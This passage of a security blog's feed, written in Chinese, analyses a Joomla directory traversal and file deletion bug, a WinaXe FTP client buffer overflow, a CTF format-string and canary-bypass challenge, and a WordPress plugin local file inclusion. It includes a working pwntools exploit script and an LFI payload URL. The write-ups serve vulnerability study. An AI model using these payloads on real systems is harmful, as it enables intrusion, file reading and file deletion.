class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public function get($property, $default = null)</span><br><span class="line">&#123;</span><br><span class="line">// If $model is null we use the default model</span><br><span class="line">if ($default === null)</span><br><span class="line">&#123;</span><br><span class="line">$model = $this-&gt;_defaultModel;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$model = strtolower($default);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// First check to make sure the model requested exists</span><br><span class="line">if (isset($this-&gt;_models[$model]))</span><br><span class="line">&#123;</span><br><span class="line">// Model exists, let&apos;s build the method name</span><br><span class="line">$method = &apos;get&apos; . ucfirst($property);</span><br><span class="line"></span><br><span class="line">// Does the method exist?</span><br><span class="line">if (method_exists($this-&gt;_models[$model], $method))</span><br><span class="line">&#123;</span><br><span class="line">// The method exists, let&apos;s call it and return what we get</span><br><span class="line">$result = $this-&gt;_models[$model]-&gt;$method();</span><br><span class="line"></span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/2.PNG" alt="2"><br>在最后<code>$result</code>的值由对应<code>_models[$model]</code>中的<code>$method</code>方法决定，此处会进入<code>getimages</code>函数，继续单步跟入。<br>/administrator/components/com_media/models/list.php代码58-63行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function getImages()</span><br><span class="line">&#123;</span><br><span class="line">$list = $this-&gt;getList();</span><br><span class="line"></span><br><span class="line">return $list[&apos;images&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序调用<code>getList</code>函数获取list列表，然后从列表中获取images的值并返回，继续跟入。<br>/administrator/components/com_media/models/list.php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function getList()</span><br><span class="line">&#123;</span><br><span class="line">static $list;</span><br><span class="line">......</span><br><span class="line">// Get current path from request</span><br><span class="line">$current = (string) $this-&gt;getState(&apos;folder&apos;);</span><br><span class="line">$basePath  = COM_MEDIA_BASE . ((strlen($current) &gt; 0) ? &apos;/&apos; . $current : &apos;&apos;);</span><br><span class="line">$mediaBase = str_replace(DIRECTORY_SEPARATOR, &apos;/&apos;, COM_MEDIA_BASE . &apos;/&apos;);</span><br><span class="line">......</span><br><span class="line">$fileList   = false;</span><br><span class="line">$folderList = false;</span><br><span class="line"></span><br><span class="line">if (file_exists($basePath))</span><br><span class="line">&#123;</span><br><span class="line">// Get the list of files and folders from the given folder</span><br><span class="line">$fileList   = JFolder::files($basePath);</span><br><span class="line">$folderList = JFolder::folders($basePath);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">$list = array(&apos;folders&apos; =&gt; $folders, &apos;docs&apos; =&gt; $docs, &apos;images&apos; =&gt; $images, &apos;videos&apos; =&gt; $videos);</span><br></pre></td></tr></table></figure><p><code>$current</code>为当前相对路径的值，而<code>$basePath</code>为当前绝对路径的值,<code>JFolder::files</code>和<code>JFolder::folders</code>分别获取对应路径下的文件名与文件夹名，之后程序会根据后缀名等信息划分<code>folders</code>、<code>docs</code>、<code>images</code>等，并最终放入<code>list</code>数组。之后<code>list</code>数组会作为结果传递给<code>$this-&gt;folders</code>,最终作为数据渲染页面。</p><p>而其实<code>$current</code>的值是有所过滤的，单步跟入getState函数<br><img src="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/3.PNG" alt="3"><br>继续跟入get函数<br><img src="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/4.PNG" alt="4"><br>程序会调用<code>clean</code>函数，对数据进行过滤，继续跟入<br>/libraries/vendor/joomla/filter/src/InputFilter.php代码434-454行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">case &apos;PATH&apos;:</span><br><span class="line">$pattern = &apos;/^[A-Za-z0-9_\/-]+[A-Za-z0-9_\.-]*([\\\\\/][A-Za-z0-9_-]+[A-Za-z0-9_\.-]*)*$/&apos;;</span><br><span class="line"></span><br><span class="line">if (is_array($source))</span><br><span class="line">&#123;</span><br><span class="line">$result = array();</span><br><span class="line"></span><br><span class="line">// Iterate through the array</span><br><span class="line">foreach ($source as $eachString)</span><br><span class="line">&#123;</span><br><span class="line">preg_match($pattern, (string) $eachString, $matches);</span><br><span class="line">$result[] = isset($matches[0]) ? (string) $matches[0] : &apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">preg_match($pattern, $source, $matches);</span><br><span class="line">$result = isset($matches[0]) ? (string) $matches[0] : &apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">break;</span><br></pre></td></tr></table></figure></p><p>对于PATH路径，程序会使用正则去匹配，从正则中我们也能看出，我们能够使正则匹配到/..,却无法使正则匹配到/../..这种，因此我们只能返回到主目录，却不能继续往上。<br>而在/libraries/src/Filesystem/Path.php中，<code>$path = preg_replace(&#39;#[/\\\\]+#&#39;, $ds, $path);</code>会使类似于<code>images//..</code>转换为<code>images\..</code>,从而使得能使用<code>readdir</code>函数读取对应路径下的内容。</p><h3 id="任意文件删除分析"><a href="#任意文件删除分析" class="headerlink" title="任意文件删除分析"></a>任意文件删除分析</h3><p><img src="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/5.PNG" alt="5"><br>与之有关的函数位于/administrator/components/com_media/controllers/folder.php<br><code>$folder</code>的值与上面的分析相同，依旧使<code>/..</code>,<code>$path</code>的值则为我们输入的要删除的文件名<br><img src="/2019/04/29/Joomla-Core-1-5-0-3-9-4-Directory-Traversal-Authenticated-Arbitrary-File-Deletion分析/6.PNG" alt="6"><br>而在之后的代码中，会根据<code>$folder</code>与<code>$path</code>获取到<code>$fulpath</code>的值。在108行代码处，会调用删除函数。<br><code>$ret &amp;= JFile::delete($object_file-&gt;filepath);</code><br>接着跟入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$file = $pathObject-&gt;clean($file);</span><br><span class="line">if (!is_file($file))</span><br><span class="line">&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">// Try making the file writable first. If it&apos;s read-only, it can&apos;t be deleted</span><br><span class="line">// on Windows, even if the parent folder is writable</span><br><span class="line">@chmod($file, 0777);</span><br><span class="line">// In case of restricted permissions we zap it one way or the other</span><br><span class="line">// as long as the owner is either the webserver or the ftp</span><br><span class="line">if (@unlink($file))</span><br><span class="line">&#123;</span><br><span class="line">// Do nothing</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>clean</code>函数会使得<code>$file</code>中的<code>/..</code>转换为<code>\..</code>,使得<code>unlink</code>函数能够顺利删除对应文件。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ul><li>属于后台漏洞，需要知道管理员账户和密码。</li><li>目录穿越最多只能到网站根目录，并不是真正的目录穿越以及任意文件删除。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;目录遍历&lt;br&gt;&lt;code&gt;?option=com_media&amp;amp;view=mediaList&amp;amp;t
+      
+    
+    </summary>
+    
+    
+      <category term="php,Directory Traversal" scheme="http://yoursite.com/tags/php-Directory-Traversal/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WinaXe 7.7 FTP Client - Remote Buffer Overflow</title>
+    <link href="http://yoursite.com/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/"/>
+    <id>http://yoursite.com/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/</id>
+    <published>2019-04-25T06:55:43.000Z</published>
+    <updated>2019-04-25T07:01:29.604Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>运行攻击脚本，在本机上开放21端口，等待客户端连接。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/1.PNG" alt="1"><br>靶机上打开ftp，并连接指定地址<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/2.PNG" alt="2"><br>程序退出，并弹出计算器</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>为了能让windbg正确显示栈回溯时的数据，我们这里需要增加payload中的填充字符的长度。然后使用windbg附加ftp程序，重复攻击过程。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/3.PNG" alt="3"><br>能发现此时断在了<code>0x0042cac5</code>处,我们在该处下断点，然后单步跟进程序(注意：在此时的过程中，存在循环操作，可以在循环操作之后下断点，然后使用g命令跳过)。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/4.PNG" alt="4"><br>程序在<code>0042cc2d</code>处执行<code>call ftp+0x4597</code>之后，便崩溃了，所以我们在<code>0042cc2d</code>处下断点，单步跟入，并继续执行。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/5.PNG" alt="5"><br>与上面的过程类似，程序在<code>004045a9</code>之后便出现了问题，继续下断点，并跟进。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/6.PNG" alt="6"><br>发现在<code>sub_404502</code>函数结束，返回之时程序出现了错误，此时栈上的值已经被我们输入的<code>A</code>填满，因此可以确定，程序漏洞的触发点在于<code>sub_404502</code>函数返回地址被覆盖。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>回到刚开始的<code>0042cc2d</code>处，我们能看到esi的值指向我们输入的数据，而代码中则是将<code>[esi]</code>的值赋值给<code>edi</code><br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/7.PNG" alt="7"><br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/8.PNG" alt="8"><br>所以我们需要查看esi的值从何而来，继续往上跟踪esi。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/9.PNG" alt="9"><br>能发现最后一次修改esi的值是在<code>0042CAB1</code>处，与esp有关，所以我们接下来需要跟踪栈上的值何时传入我们的数据。<br>我们所下断点的位置位于<code>sub_42C890</code>函数中，所以可以在<code>0042C890</code>处下断点，并单步执行，观察栈中的值。这里的跟踪步骤就不再详述。<br>最终的函数调用栈如下</p><p> 1.<code>sub_42C890</code><br> 2.<code>sub_42EE10</code><br> 3.<code>sub_42EA00</code><br> 4.<code>sub_4383C0</code><br> 5.<code>_plib_free__3</code><br> 6.<code>sub_428b20</code><br> 7.<code>xwpwsock!recv_dll</code>模块中的接收函数，接收数据放置到<code>ebp</code>处</p><p><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/10.PNG" alt="10"><br>程序最后会在<code>00428B34</code>处调用<code>xwpwsock!recv_dll</code>模块中的接收函数，接收数据放置到<code>ebp</code>处。</p><h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>使用Immunity Debugger中的mona脚本生成2500个测试字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pattern_create 2500</span><br></pre></td></tr></table></figure><p>替换攻击脚本中的payload，观察此时<code>EIP</code>所指向的值。<br><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/11.PNG" alt="11"><br>获得<code>EIP</code>此时的值为<code>71433871</code>，然后使用mona脚本计算相应的偏移量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pattern_offset 71433871</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/12.PNG" alt="12"><br>凭此我们就能确定偏移为2065</p><h3 id="确定跳板地址"><a href="#确定跳板地址" class="headerlink" title="确定跳板地址"></a>确定跳板地址</h3><p>既然漏洞触发点是在函数返回地址，所以我们可以使用<code>jmp esp</code>或者<code>pop esp;ret</code>的方法来使程序到达我们的shellcode处。<br>使用Immunity Debugger中的mona脚本来寻找程序中有关<code>jmp esp</code>有关的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/25/WinaXe-7-7-FTP-Client-Remote-Buffer-Overflow/13.PNG" alt="13"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;漏洞验证&quot;&gt;&lt;a href=&quot;#漏洞验证&quot; class=&quot;headerlink&quot; title=&quot;漏洞验证&quot;&gt;&lt;/a&gt;漏洞验证&lt;/h1&gt;&lt;p&gt;运行攻击脚本，在本机上开放21端口，等待客户端连接。&lt;br&gt;&lt;img src=&quot;/2019/04/25/WinaXe-7-7
+      
+    
+    </summary>
+    
+    
+      <category term="windows,BOF" scheme="http://yoursite.com/tags/windows-BOF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>pwn题解析-bin</title>
+    <link href="http://yoursite.com/2019/04/19/pwn%E9%A2%98%E8%A7%A3%E6%9E%90-bin/"/>
+    <id>http://yoursite.com/2019/04/19/pwn题解析-bin/</id>
+    <published>2019-04-19T05:37:43.000Z</published>
+    <updated>2019-04-19T05:40:24.864Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>拿到题目首先查看是什么类型的文件<br><img src="/2019/04/19/pwn题解析-bin/1.PNG" alt="1"><br>然后看一看开启了哪些保护<br><img src="/2019/04/19/pwn题解析-bin/2.PNG" alt="2"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>使用ida载入程序<br><img src="/2019/04/19/pwn题解析-bin/3.PNG" alt="3"><br>能看到程序会先接收我们的数据，并使用printf函数打印出来。<br>这里printf函数没有限定前面的格式化字符串，存在格式化字符串漏洞，我们能构造特定的format参数，从栈上泄露数据。<br>紧接着程序会调用fun函数<br><img src="/2019/04/19/pwn题解析-bin/4.PNG" alt="4"><br>能看到程序会调用read函数往buf里面写入数据，但是buf位于ebp-70h<br>,而接收长度却能达到0x78,也就是一定能够覆盖返回地址的。<br><img src="/2019/04/19/pwn题解析-bin/5.PNG" alt="5"><br>而我们能在程序中发现<code>getflag</code>这个函数，直接跟进查看。<br><img src="/2019/04/19/pwn题解析-bin/6.PNG" alt="6"><br>发现这个函数能够读取flag中的内容并显示，也就是说如果我们利用上面的缓冲区溢出，将main函数的返回地址覆盖为getflag函数，就能实现读取flag。<br>但是因为程序开启了CANARY保护，在main函数结束会检测CANARY的值是否被更改。因此我们可以使用格式化字符串漏洞泄露栈上的CANARY的值，然后在之后的溢出过程中，在相同位置填入原本的值，即可绕过CANARY保护。</p><h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p><img src="/2019/04/19/pwn题解析-bin/7.PNG" alt="7"><br>从代码中能看到在73c-742这两步，将CANARY的值存放进了ebp-0xc处这个位置。将断点下载745处，然后查看对应位置的值。<br><img src="/2019/04/19/pwn题解析-bin/8.PNG" alt="8"><br>能看到此时0xffffd08c存放的值为0xb8b1b600，这就是CANARY的值。<br>然后我们在call printf处下断点，运行至此处。查看此时栈上的值。<br><img src="/2019/04/19/pwn题解析-bin/9.PNG" alt="9"><br>栈顶的值0xffffd086是printf函数的第一个参数，而如果按此推算，0xb8b1b600相当于第八个参数，之间的偏移为7。因此我们可以输入%7$x,来泄露偏移为7的参数的值。<br>然后我们在0x08048714处下断点，也就是在执行完fun函数内的read函数之后。观察栈上的值。<br><img src="/2019/04/19/pwn题解析-bin/9.PNG" alt="9"><br>0x44434241是我们输入的值，0xb8b1b600是CNAARY的值，之间的偏移为100，而0x08048774是fun函数的返回地址，距离CANARY之间的值为12。<br>因此payload可以写成填充字符串(100长度)+泄露的CANARY的值+填充字符串(12长度)+需要的返回地址</p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./bin&quot;)</span><br><span class="line">e=ELF(&quot;./bin&quot;)</span><br><span class="line">p.sendline(&quot;%7$x&quot;)</span><br><span class="line">canary=int(p.recv(),16)</span><br><span class="line">getflag_address=e.symbols[&quot;getflag&quot;]</span><br><span class="line">payload=&quot;A&quot;*100+p32(canary)+&quot;A&quot;*12+p32(getflag_address)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;拿到题目首先查看是什么类型的文件&lt;br&gt;&lt;img src=&quot;/2019/04/19/pwn题解析-bin/1.PNG&quot; al
+      
+    
+    </summary>
+    
+    
+      <category term="pwn 格式化字符串漏洞" scheme="http://yoursite.com/tags/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WordPress_Plugin_Anti-Malware_Security_and_Brute-Force_Firewall_4.18.63_LFI</title>
+    <link href="http://yoursite.com/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/"/>
+    <id>http://yoursite.com/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/</id>
+    <published>2019-04-19T02:21:35.000Z</published>
+    <updated>2019-04-19T02:23:56.942Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞产生于WordPress的Anti-Malware Security and Brute-Force Firewall插件上，所以我们安装好wordpress之后，后台登录，并在插件页面中搜索Anti-Malware有关的插件，找到Anti-Malware Security and Brute-Force Firewall并安装。<br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/1.PNG" alt="1"><br>安装好之后，点击进入我们的插件页面，并进行一次简单的扫描<br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/2.PNG" alt="2"><br>之后我们就能从url中获取到所需的GOTMLS_mt参数<br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/3.PNG" alt="3"><br>然后使用以下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wp-admin/admin-ajax.php?action=GOTMLS_scan&amp;GOTMLS_mt=32fd564ad6974510e6bcd22815853f3d&amp;mt=1553627072.7669&amp;page=GOTMLS-settings&amp;GOTMLS_scan=&lt;base64 encoded file path&gt;</span><br></pre></td></tr></table></figure><p>注意：上面的GOTMLS_mt参数需要根据实际获取进行修改，GOTMLS_scan参数中输入的base64编码需要去掉后面的等号<br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/4.PNG" alt="4"><br>(1234是我文件中的内容，这里只是为了演示方便)</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>wordpress安装的插件一般都在wp-content\plugins路径下，我们能在其找到安装的gotmls文件。<br>使用Seay代码审计工具载入该文件。因为我们的漏洞利用点是与GOTMLS_scan参数以及base64有关，所以我们应该关注这两个方向。<br>直接全局搜索<code>$_GET[&quot;GOTMLS_scan&quot;]</code><br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/5.PNG" alt="5"><br>能看到4、5中存在对get获取到的GOTMLS_scan参数进行解密的操作，先跟进4处的代码。<br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/6.PNG" alt="6"><br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/7.PNG" alt="7"><br>程序使用GOTMLS_decode函数对GOTMLS_scan参数解密之后，会对解密之后的<code>$file</code>值进行判断，如果不为数字以及目录就会进入下面这个逻辑。<br><img src="/2019/04/19/WordPress-Plugin-Anti-Malware-Security-and-Brute-Force-Firewall-4-18-63-LFI/8.PNG" alt="8"><br>程序会判断<code>$file</code>对应的文件是否存在，之后会将<code>$file</code>作为参数传入GOTMLS_scanfile函数。<br>GOTMLS_scanfile函数部分代码逻辑如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function GOTMLS_scanfile($file) &#123;</span><br><span class="line">global $wpdb, $GOTMLS_chmod_file, $GOTMLS_chmod_dir;</span><br><span class="line">$GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;debug_fix&quot;]=&quot;Scanning...&quot;;</span><br><span class="line">$GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;threats_found&quot;] = array();</span><br><span class="line">$gt = &quot;&gt;&quot;;</span><br><span class="line">$lt = &quot;&lt;&quot;;</span><br><span class="line">$found = false;</span><br><span class="line">$threat_link = &quot;&quot;;</span><br><span class="line">$className = &quot;scanned&quot;;</span><br><span class="line">$real_file = realpath($file);</span><br><span class="line">$clean_file = GOTMLS_encode($real_file);</span><br><span class="line">if (is_file($real_file) &amp;&amp; ($filesize = filesize($real_file)) &amp;&amp; ($GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;file_contents&quot;] = @file_get_contents($real_file))) &#123;</span><br></pre></td></tr></table></figure><p>该函数将<code>$file</code>转换为绝对路径赋值给<code>$real_file</code>,然后判断是否属于文件，并使用<code>file_get_contents</code>读取文件内容赋值给全局变量<code>[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;file_contents&quot;]</code>。<br>回到之前代码，之后程序会判断是否存在<code>$_GET[$function]</code>参数以及全局变量<code>$GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;threats_found&quot;]</code>，否则会执行下面的逻辑。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">else</span><br><span class="line">$fa = &quot; No Threats Found&quot;;</span><br><span class="line">die(&quot;\n$script_form&quot;.admin_url(&apos;admin-ajax.php?&apos;.GOTMLS_set_nonce(__FUNCTION__.&quot;1821&quot;)).&apos;&quot; onsubmit=&quot;return confirm(\&apos;&apos;.__(&quot;Are you sure this file is not infected and you want to ignore it in future scans?&quot;,&apos;gotmls&apos;).&apos;\&apos;);&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;GOTMLS_whitelist&quot; value=&quot;&apos;.GOTMLS_encode($file).&apos;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;GOTMLS_whitelist&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;GOTMLS_chksum&quot; value=&quot;&apos;.md5($GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;file_contents&quot;]).&apos;O&apos;.GOTMLS_installation_key.&apos;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Whitelist this file&quot; style=&quot;float: right;&quot;&gt;&lt;/form&gt;&apos;.GOTMLS_file_details($file).&apos;&lt;div style=&quot;overflow: auto;&quot;&gt;&lt;span onmouseover=&quot;document.getElementById(\&apos;file_details_&apos;.md5($file).&apos;\&apos;).style.display=\&apos;block\&apos;;&quot; onmouseout=&quot;document.getElementById(\&apos;file_details_&apos;.md5($file).&apos;\&apos;).style.display=\&apos;none\&apos;;&quot;&gt;&apos;.__(&quot;Potential threats in file:&quot;,&apos;gotmls&apos;).&apos;&lt;/span&gt; (&apos;.$fa.&apos; )&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;height: 100%&quot;&gt;&lt;textarea id=&quot;ta_file&quot; style=&quot;width: 100%; height: 100%&quot;&gt;&apos;.GOTMLS_htmlentities(str_replace(&quot;\r&quot;, &quot;&quot;, $GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;file_contents&quot;])).&apos;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&apos;);</span><br></pre></td></tr></table></figure><p>能看到在代码最后，拼接了<code>GOTMLS_htmlentities(str_replace(&quot;\r&quot;, &quot;&quot;, $GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;file_contents&quot;]))</code>,而<code>$GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;file_contents&quot;]</code>的值正是之前读取的<code>$_GET[&quot;GOTMLS_scan&quot;]</code>所指定文件的内容，造成了本地文件包含的问题。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;漏洞产生于WordPress的Anti-Malware Security and Brute-Force Firewall插
+      
+    
+    </summary>
+    
+    
+      <category term="web WordPress LFI" scheme="http://yoursite.com/tags/web-WordPress-LFI/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>LCTF-bestphp&#39;s revenge 小结</title>
+    <link href="http://yoursite.com/2018/11/21/LCTF-bestphp-s-revenge/"/>
+    <id>http://yoursite.com/2018/11/21/LCTF-bestphp-s-revenge/</id>
+    <published>2018-11-21T13:14:36.000Z</published>
+    <updated>2018-11-21T15:07:42.000Z</updated>
+    
